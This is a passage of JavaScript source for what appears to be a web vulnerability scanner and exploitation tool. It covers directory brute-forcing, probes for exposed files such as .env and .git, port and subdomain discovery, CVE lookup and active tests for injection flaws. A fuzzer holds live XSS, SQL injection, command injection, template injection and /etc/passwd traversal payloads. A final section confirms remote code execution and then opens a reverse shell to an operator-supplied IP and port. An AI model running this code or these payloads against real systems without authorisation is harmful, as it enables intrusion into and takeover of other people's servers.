    '.svn', '.hg', '.bzr', 'CVS',
    'server-info', 'server-status',
    'health', 'healthcheck', 'status', 'info', 'metrics', 'monitoring',
    'swagger-ui', 'swagger', 'docs', 'documentation', 'redoc',
    'graphql', 'graphiql', 'playground',
    'sitemap.xml', 'crossdomain.xml', 'security.txt', '.well-known',
    'composer.json', 'package.json', 'Gemfile', 'requirements.txt',
    'Dockerfile', 'docker-compose.yml', '.dockerenv',
    'wp-cron.php', 'xmlrpc.php', 'readme.html', 'license.txt',
    'user', 'users', 'account', 'accounts', 'profile', 'register', 'signup',
];

async function dirbust(baseUrl, wordlist = DIRECTORY_WORDLIST) {
    const found = [];
    const base = baseUrl.replace(/\/$/, '');
    const checks = wordlist.map(path =>
        httpGet(`${base}/${path}`, { timeout: 4000 })
            .then(r => {
                if (r.status < 400 && r.status !== 0) {
                    const body = typeof r.data === 'string' ? r.data : '';
                    const size = body.length;
                    // Skip if it's a generic 404 page or redirect to home
                    if (size > 50) {
                        found.push({ path: `/${path}`, status: r.status, size, title: (body.match(/<title[^>]*>([^<]+)<\/title>/i) || [])[1] || '' });
                    }
                }
            })
            .catch(() => {})
    );
    // Run 10 at a time to avoid overwhelming target
    for (let i = 0; i < checks.length; i += 10) {
        await Promise.all(checks.slice(i, i + 10));
    }
    return found.sort((a, b) => a.status - b.status);
}

// ─── 9. Sensitive File Check ──────────────────────────────────

const SENSITIVE_PATHS = [
    { path: '/.env',             name: '.env file',       check: b => b.includes('=') && (b.includes('DB_') || b.includes('API_') || b.includes('SECRET') || b.includes('PASSWORD')) },
    { path: '/.git/HEAD',        name: '.git exposed',    check: b => b.includes('ref:') || /^[0-9a-f]{40}$/.test(b.trim()) },
    { path: '/.git/config',      name: '.git config',     check: b => b.includes('[core]') || b.includes('[remote') },
    { path: '/robots.txt',       name: 'robots.txt',      check: b => b.includes('Disallow') || b.includes('Allow'), severity: 'info' },
    { path: '/.DS_Store',        name: '.DS_Store',       check: b => b.includes('\x00Bud1') },
    { path: '/wp-login.php',     name: 'WordPress login', check: b => b.includes('wp-login') },
    { path: '/phpinfo.php',      name: 'phpinfo()',       check: b => b.includes('PHP Version') },
    { path: '/server-status',    name: 'Apache status',   check: b => b.includes('Apache Server Status') },
    { path: '/server-info',      name: 'Apache info',     check: b => b.includes('Apache Server Information') },
    { path: '/elmah.axd',        name: 'ELMAH logs',      check: b => b.includes('Error Log') },
    { path: '/debug',            name: 'Debug page',      check: b => b.includes('Traceback') || b.includes('stack trace') },
    { path: '/api/swagger.json', name: 'Swagger spec',    check: b => b.includes('"swagger"') || b.includes('"openapi"') },
    { path: '/graphql',          name: 'GraphQL',         check: b => b.includes('query') || b.includes('schema'), method: 'POST' },
    { path: '/xmlrpc.php',       name: 'XML-RPC',         check: b => b.includes('XML-RPC') },
    { path: '/wp-json/',         name: 'WP REST API',     check: b => b.includes('wp/v2') },
    { path: '/actuator',         name: 'Spring Actuator', check: b => b.includes('_links') || b.includes('actuator') },
    { path: '/actuator/env',     name: 'Actuator Env',    check: b => b.includes('propertySources') || b.includes('activeProfiles') },
    { path: '/actuator/health',  name: 'Actuator Health', check: b => b.includes('"status"') && b.includes('"UP"') },
    { path: '/config.php.bak',   name: 'Config backup',   check: b => b.includes('<?php') || b.includes('DB_') },
    { path: '/backup.sql',       name: 'SQL dump',        check: b => b.includes('CREATE TABLE') || b.includes('INSERT INTO') },
    { path: '/.htaccess',        name: '.htaccess',       check: b => b.includes('RewriteEngine') || b.includes('AuthType') },
    { path: '/.htpasswd',        name: '.htpasswd',       check: b => /\w+:\$/.test(b) || /\w+:\{/.test(b) },
    { path: '/web.config',       name: 'web.config',      check: b => b.includes('<configuration') || b.includes('connectionString') },
    { path: '/composer.json',    name: 'composer.json',   check: b => b.includes('"require"') || b.includes('"autoload"') },
    { path: '/package.json',     name: 'package.json',    check: b => b.includes('"dependencies"') || b.includes('"scripts"') },
    { path: '/Dockerfile',       name: 'Dockerfile',      check: b => b.includes('FROM ') && b.includes('RUN ') },
    { path: '/.dockerenv',       name: 'Docker env',      check: () => true },
    { path: '/wp-config.php.bak', name: 'WP config bak', check: b => b.includes('DB_NAME') || b.includes('DB_PASSWORD') },
    { path: '/crossdomain.xml',  name: 'crossdomain.xml', check: b => b.includes('cross-domain-policy') },
    { path: '/.well-known/security.txt', name: 'security.txt', check: b => b.includes('Contact:') || b.includes('Policy:'), severity: 'info' },
    { path: '/trace',            name: 'Spring trace',    check: b => b.includes('timestamp') && b.includes('info') },
    { path: '/heapdump',         name: 'Heap dump',       check: b => b.length > 1000 },
    { path: '/console',          name: 'H2 Console',      check: b => b.includes('H2 Console') || b.includes('login.jsp') },
];

async function checkSensitiveFiles(baseUrl) {
    const found = [];
    for (const sf of SENSITIVE_PATHS) {
        try {
            const url = baseUrl.replace(/\/$/, '') + sf.path;
            const r = sf.method === 'POST'
                ? await httpPost(url, { query: '{ __typename }' }, { timeout: 5000 })
                : await httpGet(url, { timeout: 5000 });
            const body = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
            if (r.status < 400 && sf.check(body)) {
                found.push({
                    path: sf.path,
                    name: sf.name,
                    status: r.status,
                    size: body.length,
                    severity: sf.severity || 'high',
                    preview: body.substring(0, 300),
                });
            }
        } catch (_) {}
    }
    return found;
}

// ─── 10. Main Scan Pipeline ──────────────────────────────────

export async function runScanV2(domain, scanId, db, broadcast) {
    const start = Date.now();
    const elapsed = () => ((Date.now() - start) / 1000).toFixed(1);

    const emit = (phase, progress, message) => {
        broadcast(scanId, { phase, progress, message, elapsed: elapsed() });
        try {
            db.prepare('INSERT INTO timeline_events (scan_id, event_type, description, timestamp) VALUES (?, ?, ?, ?)')
                .run(scanId, `phase_${phase}`, message, new Date().toISOString());
        } catch (_) {}
    };

    const phaseSafe = async (phase, progress, label, fn, fallback) => {
        try {
            return await fn();
        } catch (err) {
            const msg = err?.message ? String(err.message) : String(err);
            emit(phase, progress, `WARNING: ${label} failed: ${msg}`);
            return fallback;
        }
    };

    try {
        try {
            db.prepare("UPDATE scans SET status = 'running', started_at = ?, error_message = '' WHERE id = ?")
                .run(new Date().toISOString(), scanId);
        } catch (_) {
            db.prepare("UPDATE scans SET status = 'running', started_at = ? WHERE id = ?")
                .run(new Date().toISOString(), scanId);
        }

        emit(1, 0, `Starting scan for ${domain}...`);

        // ─── Phase 1: Probe & Fingerprint ────────────────────
        emit(1, 5, 'Phase 1: Probing target...');
        const targetUrl = `https://${domain}`;
        let html = '';
        let headers = {};
        let probeStatus = 0;
        let finalUrl = targetUrl;

        try {
            const r = await httpGet(targetUrl, { timeout: 12000 });
            html = typeof r.data === 'string' ? r.data : '';
            headers = r.headers || {};
            probeStatus = r.status;
            if (r.request?.res?.responseUrl) finalUrl = r.request.res.responseUrl;
        } catch (e) {
            // try HTTP
            try {
                const r2 = await httpGet(`http://${domain}`, { timeout: 12000 });
                html = typeof r2.data === 'string' ? r2.data : '';
                headers = r2.headers || {};
                probeStatus = r2.status;
                finalUrl = `http://${domain}`;
            } catch (_) {}
        }

        // Store live host
        const title = html.match(/<title[^>]*>([^<]+)<\/title>/i)?.[1]?.trim() || '';
        try {
            db.prepare('INSERT INTO live_hosts (scan_id, host, ip, status_code, server, title) VALUES (?, ?, ?, ?, ?, ?)')
                .run(scanId, domain, '', probeStatus, headers.server || '', title);
        } catch (_) {}

        // Fingerprint
        const techs = fingerprint(headers, html);
        const insertTech = db.prepare('INSERT INTO tech_stack (scan_id, tech_name, tech_version, tech_category, detection_method) VALUES (?, ?, ?, ?, ?)');
        for (const t of techs) {
            try {
                insertTech.run(scanId, t.name, t.version || '', t.category, 'fingerprint');
            } catch (_) {}
        }
        emit(1, 12, `Fingerprinted ${techs.length} technologies: ${techs.map(t => t.name).join(', ') || 'none detected'}`);

        // ─── Phase 2: DNS & Ports ────────────────────────────
        emit(2, 13, 'Phase 2: Subdomain discovery (CT + OSINT + DNS)...');
        const discoveredSubs = await phaseSafe(2, 13, 'Subdomain discovery', async () => discoverSubdomains(domain), []);
        const insertSub = db.prepare('INSERT INTO subdomains (scan_id, subdomain, source) VALUES (?, ?, ?)');
        try { insertSub.run(scanId, domain, 'root'); } catch (_) {}
        for (const entry of discoveredSubs) {
            try {
                if (entry && typeof entry === 'object') {
                    insertSub.run(scanId, entry.subdomain, entry.source || 'enum');
                } else {
                    insertSub.run(scanId, String(entry), 'enum');
                }
            } catch (_) {}
        }
        emit(2, 14, `Discovered ${discoveredSubs.length + 1} subdomain(s).`);

        // Probe a small subset of discovered subdomains to populate live_hosts.
        emit(2, 15, 'Phase 2: Probing discovered subdomains (HTTP)...');
        const toProbe = discoveredSubs
            .map(e => (e && typeof e === 'object') ? e.subdomain : String(e))
            .filter(h => h && h !== domain)
            .slice(0, 50);

        const insertLive = db.prepare('INSERT INTO live_hosts (scan_id, host, ip, status_code, server, title) VALUES (?, ?, ?, ?, ?, ?)');
        let responsive = 0;
        await mapLimit(toProbe, 10, async (host) => {
            let ip = '';
            try {
                const ips = await withTimeout(dns.resolve4(host), 2500, null);
                if (Array.isArray(ips) && ips[0]) ip = String(ips[0]);
            } catch (_) {}

            // Try HTTPS then HTTP
            let r = null;
            try { r = await httpGet(`https://${host}`, { timeout: 8000, maxRedirects: 3 }); } catch (_) {}
            if (!r) {
                try { r = await httpGet(`http://${host}`, { timeout: 8000, maxRedirects: 3 }); } catch (_) {}
            }
            if (!r) return;

            const body = typeof r.data === 'string' ? r.data : '';
            const title = body.match(/<title[^>]*>([^<]+)<\/title>/i)?.[1]?.trim() || '';
            const server = r.headers?.server || '';
            const status = Number.isFinite(r.status) ? r.status : 0;
            if (status > 0) {
                responsive++;
                try { insertLive.run(scanId, host, ip, status, server, title); } catch (_) {}
            }
        });
        emit(2, 18, `Probed ${toProbe.length} subdomain(s); ${responsive} responded.`);

        emit(2, 20, 'Phase 2: DNS resolution...');
        const dnsRecords = await phaseSafe(2, 20, 'DNS resolution', async () => resolveDNS(domain), []);
        const insertDNS = db.prepare('INSERT INTO dns_records (scan_id, domain, record_type, record_value) VALUES (?, ?, ?, ?)');
        for (const r of dnsRecords) {
            try {
                insertDNS.run(scanId, domain, r.type, r.value);
            } catch (_) {}
        }
        emit(2, 22, `Resolved ${dnsRecords.length} DNS records.`);

        emit(2, 24, 'Phase 2: Port scanning...');
        const openPorts = await phaseSafe(2, 24, 'Port scanning', async () => portScan(domain), []);
        const insertPort = db.prepare('INSERT INTO ports (scan_id, host, port, state, service, version) VALUES (?, ?, ?, ?, ?, ?)');
        for (const p of openPorts) {
            try {
                insertPort.run(scanId, domain, p.port, 'open', p.service, '');
            } catch (_) {}
        }
        emit(2, 30, `Found ${openPorts.length} open ports.`);

        // ─── Phase 3: SSL ────────────────────────────────────
        emit(3, 32, 'Phase 3: SSL/TLS analysis...');
        const ssl = await phaseSafe(3, 32, 'SSL/TLS analysis', async () => checkSSL(domain), null);
        if (ssl?.expired) {
            db.prepare('INSERT INTO vulnerabilities (scan_id, cve_id, severity, description, vuln_type) VALUES (?, ?, ?, ?, ?)')
                .run(scanId, 'SSL-EXPIRED', 'high', `SSL certificate expired on ${ssl.validTo}`, 'SSL');
        }
        if (ssl?.selfSigned) {
            db.prepare('INSERT INTO vulnerabilities (scan_id, cve_id, severity, description, vuln_type) VALUES (?, ?, ?, ?, ?)')
                .run(scanId, 'SSL-SELF-SIGNED', 'medium', 'Self-signed SSL certificate', 'SSL');
        }
        emit(3, 36, ssl ? `SSL: ${ssl.protocol}, expires in ${ssl.daysUntilExpiry} days` : 'SSL check failed');

        // ─── Phase 4: Crawl & discover ───────────────────────
        emit(4, 38, 'Phase 4: Deep crawling target pages...');
        const crawled = await phaseSafe(4, 40, 'Deep crawl', async () => deepCrawl(finalUrl, 10), extractLinks(finalUrl, html));
        const insertEndpoint = db.prepare('INSERT INTO endpoints (scan_id, url, method, source, parameters) VALUES (?, ?, ?, ?, ?)');
        for (const link of crawled.links.slice(0, 200)) {
            try { insertEndpoint.run(scanId, link, 'GET', 'crawl', '[]'); } catch (_) {}
        }
        for (const form of crawled.forms) {
            try { insertEndpoint.run(scanId, form.action, form.method, 'form', JSON.stringify(form.inputs)); } catch (_) {}
        }
        const insertAsset = db.prepare('INSERT INTO assets (scan_id, url, asset_type, discovered_from) VALUES (?, ?, ?, ?)');
        for (const js of crawled.jsFiles.slice(0, 50)) {
            try { insertAsset.run(scanId, js, 'js', finalUrl); } catch (_) {}
        }
        emit(4, 45, `Crawled ${crawled.links.length} links, ${crawled.forms.length} forms, ${crawled.jsFiles.length} JS files, ${crawled.params.length} params.`);

        // ─── Phase 5: Security headers ───────────────────────
        emit(5, 48, 'Phase 5: Analyzing security headers...');
        const headerAnalysis = analyzeHeaders(headers);
        const insertVuln = db.prepare('INSERT INTO vulnerabilities (scan_id, cve_id, severity, description, vuln_type, affected_url) VALUES (?, ?, ?, ?, ?, ?)');
        for (const h of headerAnalysis.missing) {
            try {
                insertVuln.run(scanId, `HEADER-${h.name}`, h.severity, h.description, 'Missing Header', finalUrl);
            } catch (_) {}
        }
        emit(5, 52, `Headers: ${headerAnalysis.present.length} present, ${headerAnalysis.missing.length} missing.`);

        // ─── Phase 6: Sensitive files ────────────────────────
        emit(6, 54, 'Phase 6: Checking sensitive files...');
        const sensitiveFiles = await phaseSafe(6, 54, 'Sensitive file checks', async () => checkSensitiveFiles(finalUrl), []);
        for (const f of sensitiveFiles) {
            try {
                insertVuln.run(scanId, `EXPOSED-${f.name}`, f.severity, `${f.name} exposed at ${f.path} (${f.size} bytes)`, 'Sensitive File', finalUrl + f.path);
            } catch (_) {}
        }
        emit(6, 60, `Checked ${SENSITIVE_PATHS.length} paths, found ${sensitiveFiles.length} exposed.`);

        // ─── Phase 7: CVE Lookup for detected tech ───────────
        emit(7, 62, 'Phase 7: Looking up CVEs for detected technologies...');
        let totalCVEs = 0;
        for (const tech of techs.filter(t => t.category !== 'library')) {
            const keyword = tech.version ? `${tech.name} ${tech.version}` : tech.name;
            const cves = await phaseSafe(7, 62, `CVE lookup (${keyword})`, async () => fetchCVEs(keyword, 5), []);
            for (const cve of cves) {
                try {
                    insertVuln.run(scanId, cve.cve_id, cve.severity, cve.description, 'Known CVE', finalUrl);
                    totalCVEs++;
                } catch (_) {} // ignore dupes
            }
        }
        emit(7, 72, `Found ${totalCVEs} CVEs from NVD for detected technologies.`);

        // ─── Phase 8: Active vulnerability testing ───────────
        emit(8, 75, 'Phase 8: Active vulnerability testing...');
        const discoveredParams = crawled.params;
        const activeResults = [];

        const tests = [
            testXSS(finalUrl, discoveredParams),
            testSQLi(finalUrl, discoveredParams),
            testRCE(finalUrl, discoveredParams),
            testSSTI(finalUrl, discoveredParams),
            testLFI(finalUrl, discoveredParams),
            testOpenRedirect(finalUrl, discoveredParams),
            testCORS(finalUrl),
            testSSRF(finalUrl, discoveredParams),
            testHTTPMethods(finalUrl),
        ];
        const results = await Promise.allSettled(tests);

        for (const r of results) {
            if (r.status === 'fulfilled' && r.value.vulnerable) {
                const v = r.value;
                activeResults.push(v);
                const sev = (v.type === 'RCE' || v.type === 'SSTI' || v.type === 'SSRF') ? 'critical'
                    : (v.type === 'SQLi' || v.type === 'LFI') ? 'high'
                    : v.type === 'Open Redirect' ? 'medium'
                    : v.type === 'HTTP Methods' ? 'medium'
                    : v.severity || 'high';
                insertVuln.run(scanId, `ACTIVE-${v.type}`, sev, v.evidence || `${v.type} found via "${v.param}"`, v.type, finalUrl);

                // Also store as exploit result
                db.prepare('INSERT INTO exploit_results (scan_id, cve_id, affected_url, exploitable, confidence, payload_used, evidence, risk_score) VALUES (?, ?, ?, ?, ?, ?, ?, ?)')
                    .run(scanId, `ACTIVE-${v.type}`, finalUrl, 1, 90, v.payload || '', v.evidence || '', sev === 'critical' ? 95 : sev === 'high' ? 80 : 50);
            }
        }
        emit(8, 88, `Active tests: ${activeResults.length} vulnerabilities confirmed (${activeResults.map(r => r.type).join(', ') || 'none'}).`);

        // ─── Phase 9: Scoring ────────────────────────────────
        emit(9, 92, 'Phase 9: Calculating risk score...');
        const allVulns = await phaseSafe(
            9,
            92,
            'Loading vulnerabilities for scoring',
            async () => db.prepare('SELECT * FROM vulnerabilities WHERE scan_id = ?').all(scanId),
            []
        );
        const critCount = allVulns.filter(v => v.severity === 'critical').length;
        const highCount = allVulns.filter(v => v.severity === 'high').length;
        const medCount = allVulns.filter(v => v.severity === 'medium').length;
        const lowCount = allVulns.filter(v => v.severity === 'low' || v.severity === 'info').length;
        const riskScore = Math.min(100, critCount * 25 + highCount * 15 + medCount * 5 + lowCount * 1) || 5;

        emit(9, 96, `Risk score: ${riskScore}/100 — ${critCount} critical, ${highCount} high, ${medCount} medium, ${lowCount} low.`);

        // ─── Phase 10: Complete ──────────────────────────────
        const subdomainCount = db.prepare('SELECT COUNT(*) AS c FROM subdomains WHERE scan_id = ?').get(scanId)?.c || 0;
        const liveHostCount = db.prepare('SELECT COUNT(*) AS c FROM live_hosts WHERE scan_id = ?').get(scanId)?.c || 0;

        try {
            db.prepare('UPDATE scans SET status = ?, completed_at = ?, risk_score = ?, total_vulnerabilities = ?, critical_count = ?, high_count = ?, medium_count = ?, low_count = ?, subdomain_count = ?, live_host_count = ?, error_message = NULL WHERE id = ?')
                .run('completed', new Date().toISOString(), riskScore, allVulns.length, critCount, highCount, medCount, lowCount, subdomainCount, liveHostCount, scanId);
        } catch (_) {
            db.prepare('UPDATE scans SET status = ?, completed_at = ?, risk_score = ?, total_vulnerabilities = ?, critical_count = ?, high_count = ?, medium_count = ?, low_count = ? WHERE id = ?')
                .run('completed', new Date().toISOString(), riskScore, allVulns.length, critCount, highCount, medCount, lowCount, scanId);
        }

        emit(10, 100, `Scan complete! ${allVulns.length} vulnerabilities in ${elapsed()}s. Risk: ${riskScore}/100.`);
        broadcast(scanId, {
            phase: 10, progress: 100, message: 'Scan completed.', completed: true,
            stats: {
                technologies: techs.length,
                dns_records: dnsRecords.length,
                open_ports: openPorts.length,
                endpoints: crawled.links.length,
                vulnerabilities: allVulns.length,
                active_confirmed: activeResults.length,
                risk_score: riskScore,
                scan_time: elapsed(),
            },
        });

    } catch (err) {
        console.error(`[SCAN ERROR] ${domain}:`, err);
        const msg = err?.message ? String(err.message) : String(err);
        try {
            db.prepare("UPDATE scans SET status = 'failed', error_message = ?, completed_at = ? WHERE id = ?")
                .run(msg.slice(0, 4000), new Date().toISOString(), scanId);
        } catch (_) {
            db.prepare("UPDATE scans SET status = 'failed', completed_at = ? WHERE id = ?")
                .run(new Date().toISOString(), scanId);
        }
        broadcast(scanId, { phase: 0, progress: 0, message: `Scan failed: ${msg}`, error: true });
    }
}

// ─── 11. Terminal-specific functions ──────────────────────────
//
// These are called by server.js terminal endpoints and write
// results to DB before returning.

export async function termHeaders(url) {
    const r = await httpGet(url);
    return analyzeHeaders(r.headers || {});
}

export async function termSSL(domain) {
    return checkSSL(domain);
}

export async function termPorts(host) {
    return portScan(host);
}

export async function termDNS(domain) {
    return resolveDNS(domain);
}

export async function termFetch(url) {
    const r = await httpGet(url);
    return { status: r.status, headers: r.headers, body: (typeof r.data === 'string' ? r.data : JSON.stringify(r.data)).substring(0, 10000) };
}

export async function termScan(url, db, scanId, userId) {
    // Full terminal scan — fingerprint + all active tests.
    // Writes to DB and returns structured results for terminal display.
    const r = await httpGet(url, { timeout: 12000 });
    const html = typeof r.data === 'string' ? r.data : '';
    const headers = r.headers || {};
    const techs = fingerprint(headers, html);
    const crawled = await deepCrawl(url, 8);
    const params = crawled.params.length > 0 ? crawled.params : ['q','search','id','page','name','input','file','url','redirect','template','cmd'];

    const tests = [
        testXSS(url, params),
        testSQLi(url, params),
        testRCE(url, params),
        testSSTI(url, params),
        testLFI(url, params),
        testOpenRedirect(url, params),
        testCORS(url),
        testSSRF(url, params),
        testHTTPMethods(url),
    ];
    const results = await Promise.allSettled(tests);
    const hits = results
        .filter(r => r.status === 'fulfilled' && r.value.vulnerable)
        .map(r => r.value);

    const headerAnalysis = analyzeHeaders(headers);
    const sensitiveFiles = await checkSensitiveFiles(url);

    // CVEs
    let cves = [];
    for (const tech of techs.filter(t => t.category !== 'library').slice(0, 3)) {
        const keyword = tech.version ? `${tech.name} ${tech.version}` : tech.name;
        const found = await fetchCVEs(keyword, 3);
        cves.push(...found);
    }

    // Write to DB if scanId provided
    if (scanId && db) {
        const insertVuln = db.prepare('INSERT INTO vulnerabilities (scan_id, cve_id, severity, description, vuln_type, affected_url) VALUES (?, ?, ?, ?, ?, ?)');
        for (const h of hits) {
            const sev = (h.type === 'RCE' || h.type === 'SSTI' || h.type === 'SSRF') ? 'critical' : (h.type === 'SQLi' || h.type === 'LFI') ? 'high' : 'medium';
            try { insertVuln.run(scanId, `ACTIVE-${h.type}`, sev, h.evidence || h.type, h.type, url); } catch (_) {}
        }
        for (const h of headerAnalysis.missing) {
            try { insertVuln.run(scanId, `HEADER-${h.name}`, h.severity, h.description, 'Missing Header', url); } catch (_) {}
        }
        for (const f of sensitiveFiles) {
            try { insertVuln.run(scanId, `EXPOSED-${f.name}`, f.severity, `${f.name} at ${f.path}`, 'Sensitive File', url + f.path); } catch (_) {}
        }
        for (const c of cves) {
            try { insertVuln.run(scanId, c.cve_id, c.severity, c.description, 'Known CVE', url); } catch (_) {}
        }
    }

    return { techs, params, hits, headerAnalysis, sensitiveFiles, cves, crawled };
}

export async function termFuzz(url) {
    const r = await httpGet(url, { timeout: 12000 });
    const html = typeof r.data === 'string' ? r.data : '';
    const crawled = extractLinks(url, html);
    const params = crawled.params.length > 0 ? crawled.params :
        ['id','user','admin','debug','test','token','key','file','path','url','redirect','page','action','cmd','exec','q','search','input','name','email','password','template'];

    const hits = [];
    let tested = 0;
    const payloads = [
        { p: '<img src=x onerror=alert(1)>', type: 'XSS', check: b => b.includes('onerror=alert(1)') },
        { p: '<svg onload=alert(1)>', type: 'XSS', check: b => b.includes('onload=alert(1)') },
        { p: "' OR 1=1-- -", type: 'SQLi', check: b => ['sql','mysql','sqlite','postgres','syntax','unclosed quotation','sqlstate'].some(e => b.toLowerCase().includes(e)) },
        { p: "1' AND SLEEP(3)--", type: 'SQLi-Blind', check: (b, elapsed) => elapsed > 2800 },
        { p: ';echo BFv2FUZZ;', type: 'RCE', check: b => b.includes('BFv2FUZZ') },
        { p: '{{7*191}}', type: 'SSTI', check: b => b.includes('1337') && !b.includes('{{7*191}}') },
        { p: '../../../../etc/passwd', type: 'LFI', check: b => b.includes('root:') },
        { p: 'http://127.0.0.1', type: 'SSRF', check: b => b.includes('localhost') || b.includes('127.0.0.1') || b.length > 500 },
    ];

    for (const payload of payloads) {
        for (const param of params.slice(0, 25)) {
            tested++;
            try {
                const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload.p)}`;
                const start = Date.now();
                const r = await httpGet(testUrl, { timeout: 8000 });
                const elapsed = Date.now() - start;
                const body = typeof r.data === 'string' ? r.data : '';
                if (payload.check(body, elapsed)) {
                    hits.push({ param, payload: payload.p, type: payload.type, status: r.status, evidence: body.substring(0, 300), elapsed });
                }
            } catch (_) {}
        }
    }

    return { hits, tested, params: params.slice(0, 25), payloadCount: payloads.length };
}

export async function termDirbust(url) {
    return dirbust(url);
}

// ═══════════════════════════════════════════════════════════════
// 12. Reverse Shell Testing
// ═══════════════════════════════════════════════════════════════

export async function testReverseShell(url, paramsList, yourIp, yourPort, options = {}) {
    // Test for RCE and attempt reverse shell exploitation
    const exploit = new ReverseShellExploit(url, paramsList[0] || 'cmd', yourIp, yourPort, {
        verbose: options.verbose || false,
        payloadType: options.payloadType || 'python',
        encoding: options.encoding || 'none',
        deliveryMethod: options.deliveryMethod || 'get',
        timeout: options.timeout || 30000,
        onOutput: options.onOutput,
        onConnect: options.onConnect,
        onClose: options.onClose,
        onError: options.onError
    });

    // First verify RCE exists
    const verification = await exploit.verifyCommandExecution('whoami', 8000);
    if (!verification.vulnerable) {
        return {
            vulnerable: false,
            type: 'Reverse Shell',
            evidence: 'RCE verification failed - cannot establish reverse shell',
            verification: verification
        };
    }

    // Attempt exploitation if verifyOnly is false
    if (!options.verifyOnly) {
        const result = await exploit.exploit(options.payloadType, {
            maxAttempts: options.maxAttempts || 2,
            verifyTimeout: options.verifyTimeout || 15000
        });

        return {
            vulnerable: result.success,
            type: 'Reverse Shell',
            evidence: result.success 
                ? `Reverse shell established to ${yourIp}:${yourPort}` 
                : `Exploitation failed: ${result.error}`,
            shellConnected: result.shellConnected,
            shellInfo: result.shellInfo,
            session: result.session,
            verification: verification,
            exploitResult: result
        };
    }

    return {
        vulnerable: true,
        type: 'RCE Verified',
        evidence: 'Command execution verified - reverse shell possible',
        verification: verification,
        payload: exploit.buildPayload(options.payloadType || 'python')
    };
}

export async function termExploit(targetUrl, vulnType, knownParams = [], options = {}) {
    // Targeted exploit verification — runs ONLY matching test type
    // Enhanced to support actual reverse shell exploitation
    let html = '', headers = {};
    try {
        const r = await httpGet(targetUrl, { timeout: 10000 });
        html = typeof r.data === 'string' ? r.data : '';
        headers = r.headers || {};
    } catch {}

    const crawled = extractLinks(targetUrl, html);
    const params = knownParams.length > 0 ? knownParams
        : crawled.params.length > 0 ? crawled.params
        : ['q','search','id','page','name','input','file','url','redirect','template','cmd','exec'];
    const type = (vulnType || '').toLowerCase();
    const results = [];
    let testName = vulnType || 'Unknown';


    if (type.includes('xss')) {
        testName = 'XSS (Cross-Site Scripting)';
        results.push(await testXSS(targetUrl, params));
    } else if (type.includes('sqli') || type.includes('sql')) {
        testName = 'SQL Injection';
        results.push(await testSQLi(targetUrl, params));
    } else if (type.includes('rce') || type.includes('command')) {
        testName = 'Remote Code Execution';
        results.push(await testRCE(targetUrl, params));
        
        // If actual exploitation requested and RCE found, attempt reverse shell
        if (options.exploit && options.yourIp && options.yourPort) {
            const rceResult = results.find(r => r.vulnerable);
            if (rceResult) {
                console.log(`[+] RCE confirmed, attempting reverse shell exploitation...`);
                const shellResult = await testReverseShell(
                    targetUrl, 
                    [rceResult.param || params[0]], 
                    options.yourIp, 
                    options.yourPort,
                    {
                        payloadType: options.payloadType || 'python',
                        verifyOnly: options.verifyOnly || false,
                        verbose: options.verbose || false
                    }
                );
                if (shellResult.shellConnected) {
                    results.push(shellResult);
                }
            }
        }
    } else if (type.includes('ssti') || type.includes('template')) {

        testName = 'Server-Side Template Injection';
        results.push(await testSSTI(targetUrl, params));
    } else if (type.includes('lfi') || type.includes('file inclusion') || type.includes('path traversal')) {
        testName = 'Local File Inclusion';
        results.push(await testLFI(targetUrl, params));
    } else if (type.includes('redirect')) {
        testName = 'Open Redirect';
        results.push(await testOpenRedirect(targetUrl, params));
    } else if (type.includes('cors')) {
        testName = 'CORS Misconfiguration';
        results.push(await testCORS(targetUrl));
    } else if (type.includes('ssrf')) {
        testName = 'Server-Side Request Forgery';
        results.push(await testSSRF(targetUrl, params));
    } else if (type.includes('method') || type.includes('http')) {
        testName = 'HTTP Method Testing';
        const mr = await testHTTPMethods(targetUrl);
        if (mr.vulnerable) {
            return { verified: true, testName, type: 'HTTP Methods', hits: mr.hits.map(h => ({ type: 'HTTP Methods', evidence: h.evidence, vulnerable: true })), params: [], details: mr };
        }
        return { verified: false, testName, type: 'HTTP Methods', hits: [], params: [] };
    } else if (type.includes('header') || type.includes('missing')) {
        testName = 'Missing Security Header';
        const ha = analyzeHeaders(headers);
        return { verified: ha.missing.length > 0, testName, type: 'Missing Header', hits: ha.missing.map(h => ({ type: 'Missing Header', evidence: h.description, vulnerable: true })), params, details: ha };
    } else if (type.includes('sensitive') || type.includes('exposed')) {
        testName = 'Sensitive File Exposure';
        const sf = await checkSensitiveFiles(targetUrl);
        return { verified: sf.length > 0, testName, type: 'Sensitive File', hits: sf.map(f => ({ type: 'Sensitive File', evidence: `${f.name} at ${f.path}`, payload: f.path, detail: (f.preview || '').substring(0, 200), vulnerable: true })), params, details: { sensitiveFiles: sf } };
    } else if (type.includes('ssl')) {
        testName = 'SSL/TLS Issue';
        try {
            const domain = new URL(targetUrl).hostname;
            const ssl = await checkSSL(domain);
            const issues = [];
            if (ssl?.expired) issues.push({ type: 'SSL', evidence: `Certificate expired: ${ssl.validTo}`, vulnerable: true });
            if (ssl?.selfSigned) issues.push({ type: 'SSL', evidence: 'Self-signed certificate detected', vulnerable: true });
            if (ssl?.daysUntilExpiry != null && ssl.daysUntilExpiry < 30) issues.push({ type: 'SSL', evidence: `Certificate expires in ${ssl.daysUntilExpiry} days`, vulnerable: true });
            return { verified: issues.length > 0, testName, type: 'SSL', hits: issues, params: [], details: ssl };
        } catch { return { verified: false, testName, type: 'SSL', hits: [], params: [] }; }
    } else if (type.includes('cve') || type.includes('known')) {
        testName = 'Known CVE Verification';
        const techs = fingerprint(headers, html);
        let cves = [];
        for (const tech of techs.slice(0, 3)) {
            const kw = tech.version ? `${tech.name} ${tech.version}` : tech.name;
            cves.push(...(await fetchCVEs(kw, 5)));
        }
        return { verified: cves.length > 0, testName, type: 'Known CVE', hits: cves.map(c => ({ type: 'CVE', evidence: `${c.cve_id}: ${(c.description || '').substring(0, 120)}`, cve: c, vulnerable: true })), params: [], details: { cves, techs } };
    } else {
        testName = 'Full Vulnerability Scan';
        const all = await Promise.allSettled([
            testXSS(targetUrl, params), testSQLi(targetUrl, params), testRCE(targetUrl, params),
            testSSTI(targetUrl, params), testLFI(targetUrl, params), testOpenRedirect(targetUrl, params),
            testCORS(targetUrl), testSSRF(targetUrl, params), testHTTPMethods(targetUrl),
        ]);
        for (const r of all) { if (r.status === 'fulfilled') results.push(r.value); }
    }

    const hits = results.filter(r => r.vulnerable);
    return { verified: hits.length > 0, testName, type: vulnType, hits, params, results };
}

export async function termReverseShell(url, yourIp, yourPort, options = {}) {
